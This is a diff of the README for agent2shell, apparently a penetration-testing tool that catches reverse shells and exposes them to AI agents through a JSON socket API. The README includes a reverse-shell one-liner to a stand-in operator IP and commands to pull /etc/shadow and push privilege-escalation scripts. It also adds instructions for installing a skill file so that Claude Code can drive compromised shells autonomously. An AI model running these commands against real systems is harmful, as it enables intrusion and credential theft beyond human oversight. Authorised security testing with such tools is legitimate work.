@@ -2,141 +2,220 @@
 
 Programmable reverse shell interface for AI agents and automation.
 
-agent2shell catches reverse shell connections over TCP and exposes them as structured JSON APIs via Unix domain sockets. AI agents, scripts, and automation tools can execute commands, transfer files, and query session metadata — all with clean output, exit codes, and timeouts.
-
-## Why
-
-After gaining RCE on a target, penetration testers land in a raw reverse shell in a separate terminal. AI agents cannot interact with it:
-
-- No programmatic API — the shell lives in another terminal process
-- No command boundaries — you can't tell where one command's output ends
-- No exit codes, no structured output
-- Terminal escape codes and prompt strings pollute output
-
-agent2shell solves this by turning a raw reverse shell into a structured, programmable interface.
-
-## Architecture
-
-```
-  Operator Terminal                          Target System
- ┌──────────────────────┐                  ┌──────────────┐
- │                      │    TCP (4444)     │              │
- │  agent2shell catch   │◄─────────────────│  bash -i >&  │
- │                      │                  │  /dev/tcp/…  │
- │  ┌────────────────┐  │                  └──────────────┘
- │  │  Unix Socket   │  │
- │  │  /tmp/a2s-*.sock│  │
- │  └───────┬────────┘  │
- │          │           │
- └──────────┼───────────┘
-            │
-    ┌───────┴────────┐
-    │  AI Agent /    │
-    │  Script / CLI  │
-    │                │
-    │  agent2shell   │
-    │  run --json    │
-    └────────────────┘
-```
-
-The operator runs `agent2shell catch` to listen for a reverse shell. On connection, a Unix domain socket is created. Any process on the operator machine — an AI agent, a script, another terminal — can send commands through that socket and receive structured JSON responses.
+Catches reverse shell connections over TCP, exposes them as structured JSON APIs via Unix domain sockets. AI agents, scripts, and CLI tools can execute commands, transfer files, and query session metadata — clean output, exit codes, timeouts.
 
 ## Quick Start
 
 ```bash
-# Terminal 1: Catch a reverse shell
+# Build
+make build
+
+# Terminal 1: catch a reverse shell
 agent2shell catch -p 4444
 
 # Target sends reverse shell
 bash -i >& /dev/tcp/OPERATOR_IP/4444 0>&1
 
-# Terminal 2: AI agent or script sends commands
-agent2shell run "whoami"
-# www-data
-
-agent2shell run --json "id"
-# {"output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n","exit_code":0,"duration_ms":12}
-
-agent2shell status --json
-# {"remote_addr":"10.10.14.5:43210","shell":"bash","user":"www-data","hostname":"target-web-01",...}
+# Terminal 2: send commands
+agent2shell run whoami
+agent2shell run uname -a
+agent2shell status
+agent2shell push ./linpeas.sh /tmp/linpeas.sh
+agent2shell pull /etc/shadow ./loot/shadow
 ```
 
-## Features
+## Architecture
 
-### Double-Marker Command Boundaries
+```
+Target (reverse shell) ──TCP:4444──→ agent2shell catch ──Unix socket──→ AI agent / CLI
+                                          │
+                                    /tmp/a2s-1.sock
+                                          │
+                                    agent2shell run
+                                    agent2shell status
+                                    agent2shell push/pull
+```
 
-Commands are wrapped with start and end markers for reliable output parsing:
+The operator runs `catch` to listen for a reverse shell. On connection, a Unix domain socket is created. Any process on the same machine can send commands through the socket.
+
+## Commands
+
+### catch
+
+Catches a reverse shell and serves the Unix socket API. The operator can also type commands directly in the terminal.
 
 ```bash
-echo '---A2S-START-a1b2c3d4---'; whoami; echo '---A2S-END-a1b2c3d4---'$?
+agent2shell catch -p 4444
+agent2shell catch -p 4444 --tag webserver
+agent2shell catch -p 4444 --log /tmp/engagement.jsonl
+agent2shell catch -p 4444 --auto-upgrade
 ```
 
-This eliminates false positives from single-marker systems and enables failure classification — distinguishing "never started" from "started but hung" from "completed with error."
+Flags:
+- `-p, --port` — TCP port (default 4444)
+- `-H, --host` — bind address (default 0.0.0.0)
+- `-t, --timeout` — per-command timeout (default 30s)
+- `--tag` — session label for broadcast/list filtering
+- `--log` — JSONL file for recording all exec commands
+- `--auto-upgrade` — attempt sh → bash upgrade on connect
 
-### Commands
+### run
 
-| Command | Description |
-|---------|-------------|
-| `catch` | TCP listener — catches reverse shell, creates Unix socket |
-| `run` | Execute a command, get structured output + exit code |
-| `status` | Session metadata (user, hostname, OS, shell, distro) |
-| `list` | List all active sessions |
-| `push` | Upload file to target (base64, chunked, checksum verified) |
-| `pull` | Download file from target |
-| `broadcast` | Execute command across multiple sessions |
+Execute a command on the target.
 
-### Session Recording
+```bash
+agent2shell run whoami
+agent2shell run ls -la /tmp
+agent2shell run -t 60 "find / -perm -4000 2>/dev/null"
+```
 
-Full session transcripts in JSONL format with timestamps for every command and output. Useful for reporting, evidence collection, and post-engagement review.
+Exit codes 0-125 are forwarded from the remote command. Exit 126 means agent2shell error.
+
+### status
+
+Session metadata.
+
+```bash
+agent2shell status
+agent2shell status --json
+```
+
+```
+Remote:      10.0.1.5:48230
+Shell:       bash
+User:        www-data
+Hostname:    target-web-01
+OS:          linux
+Arch:        amd64
+Distro:      Ubuntu 22.04
+Connected:   2026-04-23T10:30:00Z (5m ago)
+Commands:    12
+Recording:   yes
+```
+
+### list
+
+List all active sessions.
+
+```bash
+agent2shell list
+agent2shell list --json
+```
+
+### push / pull
+
+File transfer via base64 chunking with MD5 checksum verification.
+
+```bash
+agent2shell push ./linpeas.sh /tmp/linpeas.sh
+agent2shell pull /etc/shadow ./loot/shadow
+```
+
+Auto-detects available decoder on target: base64, openssl, python3, perl.
+
+### broadcast
+
+Execute a command across multiple sessions.
+
+```bash
+agent2shell broadcast --all whoami
+agent2shell broadcast --tag webserver "ss -tlnp"
+agent2shell broadcast --all --json id
+```
+
+### Targeting a specific session
+
+When multiple sessions are active, use `-s` before the subcommand:
+
+```bash
+agent2shell -s /tmp/a2s-2.sock run whoami
+agent2shell -s /tmp/a2s-2.sock status
+```
+
+Without `-s`, agent2shell auto-discovers. One session = used automatically. Multiple = error asking you to specify.
+
+## Session Recording
+
+Log all programmatic exec commands to a JSONL file:
+
+```bash
+agent2shell catch -p 4444 --log /tmp/engagement.jsonl
+```
+
+Each command produces one line:
 
 ```json
-{"ts":"2026-03-30T14:22:05.000Z","type":"exec","source":"agent","command":"id"}
-{"ts":"2026-03-30T14:22:05.012Z","type":"result","output":"uid=33(www-data)...\n","exit_code":0,"duration_ms":12}
+{"timestamp":"2026-04-23T14:21:56Z","command":"whoami","output":"ec2-user","exit_code":0,"duration_ms":2}
 ```
 
-### Target Auto-Detection
+## Remote Access via SSH Tunnel
 
-On connection, agent2shell probes the target for:
-- Shell type (sh, bash, zsh, ash, dash)
-- OS and architecture
-- Linux distribution
-- Available package manager (apt, yum, dnf, apk, pacman)
-- Service manager (systemctl, service, rc-service)
+Run agent2shell on a remote server and control it from your laptop:
 
-### Script Streaming
-
-Run local scripts on the target without uploading files. agent2shell pipes script content through the shell's stdin — the script executes on the target but never touches disk.
+```
+Target ──reverse shell──→ EC2 (agent2shell catch) ←──SSH tunnel── Your laptop
+```
 
 ```bash
-agent2shell run --stdin ./linpeas.sh
+# On EC2: start listener
+./agent2shell catch -p 4444
+
+# Target connects to EC2:4444
+
+# On your laptop: forward the Unix socket
+ssh -NL /tmp/a2s-ec2.sock:/tmp/a2s-1.sock -i key.pem user@EC2_IP
+
+# Use agent2shell locally
+agent2shell -s /tmp/a2s-ec2.sock run whoami
+agent2shell -s /tmp/a2s-ec2.sock status
+agent2shell -s /tmp/a2s-ec2.sock push ./tool /tmp/tool
 ```
 
-### SSH Tunnel Support
+See `scripts/ec2-create.sh` for automated EC2 lab setup.
 
-Unix sockets work seamlessly with SSH forwarding:
+## AI Agent Integration
+
+Copy `skills/ai-agent-usage.md` to your agent's instruction directory:
 
 ```bash
-ssh -L /tmp/a2s-remote.sock:/tmp/a2s-1.sock user@operator-box
-agent2shell run -s /tmp/a2s-remote.sock "whoami"
+cp skills/ai-agent-usage.md ~/.claude/skills/
 ```
 
-## Design Decisions
+Claude Code (or any AI agent that reads skill files) will know how to use agent2shell autonomously — executing commands, uploading tools, downloading files, querying session state.
 
-- **No embedded AI agent.** agent2shell is a clean interface. Any AI agent can use it. Embedding one would lock users into a specific provider.
-- **No encrypted transport.** Operators already have SSH tunnels, VPNs, and their own transport security.
-- **No C2 framework.** This is a shell interface, not command-and-control. It catches shells and makes them programmable. Period.
-- **Unix sockets for IPC.** Fast, no HTTP overhead, works with SSH tunneling, standard Unix tooling.
+## Installation
+
+```bash
+# From source
+git clone https://github.com/0xmagic0/agent2shell.git
+cd agent2shell
+make build
+# Binary: ./agent2shell
+
+# Or go install
+go install github.com/0xmagic0/agent2shell/cmd/agent2shell@latest
+```
+
+Requires Go 1.22+. Single static binary, zero runtime dependencies.
 
 ## Building
 
 ```bash
-make build    # Build for current platform
-make release  # Cross-compile all targets
-make test     # Unit tests
-make test-e2e # End-to-end tests
+make build              # Static binary
+make test               # Unit tests with -race
+make test-integration   # Integration tests
+make test-e2e           # End-to-end tests
+make lint               # golangci-lint
+make fmt                # gofmt + goimports
 ```
 
-Requires Go 1.22+. Produces a single static binary (CGO_ENABLED=0).
+## Design
+
+- **Not a C2 framework.** A shell interface. Catches shells, makes them programmable.
+- **Not an AI agent.** A clean bridge. Any agent connects through the socket.
+- **No embedded transport security.** Use SSH tunnels or VPNs.
+- **Unix sockets for IPC.** Fast, no HTTP overhead, works with SSH forwarding.
+- **Double-marker protocol.** Start + end markers with UUID for reliable command boundaries.
 
 ## License
 
